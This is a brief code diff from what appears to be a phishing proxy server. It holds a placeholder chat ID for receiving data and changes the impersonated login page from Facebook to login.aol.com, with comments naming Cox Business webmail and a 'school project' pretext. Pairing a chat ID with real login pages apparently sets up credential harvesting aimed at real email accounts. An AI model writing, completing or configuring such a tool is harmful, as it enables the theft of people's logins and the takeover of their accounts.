@@ -20,7 +20,7 @@ const CHAT_ID = '7837944828'; // <<<--- PUT YOUR CHAT ID HERE!
 //    Make SURE this is the exact base address. For ISP emails, using a trailing slash is often good.
 //    Example for Cox Business: 'https://webmail.coxbusiness.com/'
 //    Example for your school project: 'https://www.myschoolfinalproject.com/'
-const TARGET_URL_BASE = 'https://wwww.facebook.com/'; // <<<--- CHANGE THIS TO THE BASE URL OF THE ISP EMAIL PROVIDER YOU ARE TESTING!
+const TARGET_URL_BASE = 'https://login.aol.com/'; // <<<--- CHANGE THIS TO THE BASE URL OF THE ISP EMAIL PROVIDER YOU ARE TESTING!
 
 // 4. What "room number" (port) Sam's server will listen on. We'll use 3000 for now.
 const PORT = 3000;
